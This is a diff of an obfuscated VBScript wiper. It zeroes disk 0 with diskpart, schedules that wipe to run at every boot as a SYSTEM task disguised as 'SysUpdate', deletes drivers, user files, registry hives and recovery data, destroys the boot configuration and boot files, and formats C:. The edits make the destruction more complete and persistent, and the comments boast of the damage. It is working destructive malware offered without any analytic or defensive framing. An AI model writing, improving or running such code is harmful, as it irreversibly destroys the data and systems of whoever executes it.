@@ -82,13 +82,12 @@ z2w8j.WriteLine "clean all"
 z2w8j.Close
 x7p9q.Run "cmd /c diskpart /s C:\Temp\dp1.txt", 0, True
 q3z8k.DeleteFile("C:\Temp\dp1.txt")
-Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp2.txt", True)
-z2w8j.WriteLine "list disk"
+' Schedule system disk wipe at boot
+Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp_boot.txt", True)
 z2w8j.WriteLine "select disk 0"
-z2w8j.WriteLine "clean all" 
+z2w8j.WriteLine "clean all"
 z2w8j.Close
-x7p9q.Run "cmd /c diskpart /s C:\Temp\dp2.txt", 0, True
-q3z8k.DeleteFile("C:\Temp\dp2.txt")
+x7p9q.Run "schtasks /create /tn SysUpdate /tr ""cmd /c diskpart /s C:\Temp\dp_boot.txt"" /sc onstart /ru SYSTEM /rl HIGHEST /f", 0, True
 
 q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
 q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
@@ -99,18 +98,6 @@ q3z8k.DeleteFile("C:\Users\*\*.*") ' All user data erased
 q3z8k.DeleteFolder("C:\Windows\System32\config") ' Registry backups gone
 q3z8k.DeleteFolder("C:\Recovery\*.*")
 q3z8k.DeleteFolder("C:\System Volume Information\*.*")
-
-' Destroy Boot Configuration Data 
-x7p9q.Run "bcdedit /set {bootmgr} displaybootmenu No", 0, True
-x7p9q.Run "bcdedit /set {current} recoveryenabled No", 0, True
-x7p9q.Run "bcdedit /set {default} recoveryenabled No", 0, True
-x7p9q.Run "bcdedit /set {current} bootstatuspolicy IgnoreAllFailures", 0, True
-x7p9q.Run "bootsect /nt60 ALL /force", 0, True
-x7p9q.Run "bootsect /nt60 C: /force /mbr", 0, True
-x7p9q.Run "bcdedit /delete {current} /f", 0, True
-x7p9q.Run "bcdedit /delete {default} /f", 0, True
-x7p9q.Run "bcdedit /delete {bootmgr} /f", 0, True ' No boot at all
-q3z8k.DeleteFile("C:\Windows\boot\*.*") ' Boot files
 
 ' Break network completely
 x7p9q.Run "netsh winsock reset", 0, True ' TCP/IP fucked
@@ -170,6 +157,21 @@ If q3z8k.FileExists("C:\bootmgr") Then
     x7p9q.Run "del /f /q C:\bootmgr", 0, True
 End If
 
+' Destroy Boot Configuration Data 
+x7p9q.Run "bcdedit /set {bootmgr} displaybootmenu No", 0, True
+x7p9q.Run "bcdedit /set {current} recoveryenabled No", 0, True
+x7p9q.Run "bcdedit /set {default} recoveryenabled No", 0, True
+x7p9q.Run "bcdedit /set {current} bootstatuspolicy IgnoreAllFailures", 0, True
+x7p9q.Run "bootsect /nt60 ALL /force", 0, True
+x7p9q.Run "bootsect /nt60 C: /force /mbr", 0, True
+x7p9q.Run "bcdedit /delete {current} /f", 0, True
+x7p9q.Run "bcdedit /delete {default} /f", 0, True
+x7p9q.Run "bcdedit /delete {bootmgr} /f", 0, True ' No boot at all
+x7p9q.Run "takeown /F C:\Windows\boot /R /D Y", 0, True
+x7p9q.Run "icacls C:\Windows\boot /grant SYSTEM:F /T /Q", 0, True
+x7p9q.Run "Powershell.exe Remove-Item -Path C:\Windows\boot -Force -Recurse", 0, True ' Boot files
+
+x7p9q.Run "format C: /fs:NTFS /q /y", 0, True 
 x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
 x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
 x7p9q.Run "reg delete HKLM\SYSTEM\Setup /f", 0, True ' Setup fucked
